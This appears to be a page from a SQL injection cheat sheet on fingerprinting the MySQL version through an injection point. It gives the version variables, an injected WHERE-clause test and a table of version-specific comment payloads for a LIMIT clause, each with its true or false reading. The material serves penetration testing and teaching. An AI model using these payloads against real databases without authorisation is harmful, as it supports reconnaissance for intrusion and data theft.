---
title: Testing Version
description: Techniques for determining MySQL version information
category: Reconnaissance
order: 4
tags: ["version", "reconnaissance"]
lastUpdated: 2025-03-16
---

## Using Version Variables

You can determine the MySQL version using these variables:

```sql
VERSION()
```

```sql
@@VERSION
```

```sql
@@GLOBAL.VERSION
```

### Example

```sql
SELECT * FROM Users WHERE id = '1' AND MID(VERSION(),1,1) = '5';
```

**Note:** Output will contain `-nt-log` if the DBMS runs on a Windows-based machine.

## Using Version-Specific Code

MySQL allows version-specific code blocks to run only if the MySQL version matches:

```sql
/*!VERSION Specific Code*/
```

### Example

Given the query:
```sql
SELECT * FROM Users limit 1,{INJECTION POINT};
```

| Test Payload | Result |
|--------------|--------|
| `1 /*!50094eaea*/;` | False - version is equal or greater than 5.00.94 |
| `1 /*!50096eaea*/;` | True - version is lesser than 5.00.96 |
| `1 /*!50095eaea*/;` | False - version is equal to 5.00.95 |

### Notes
- This technique is useful for determining version information when you can't add more SQL to the query due to the position of the injection point
- For more information about MySQL-specific code, see the MySQL-specific code section
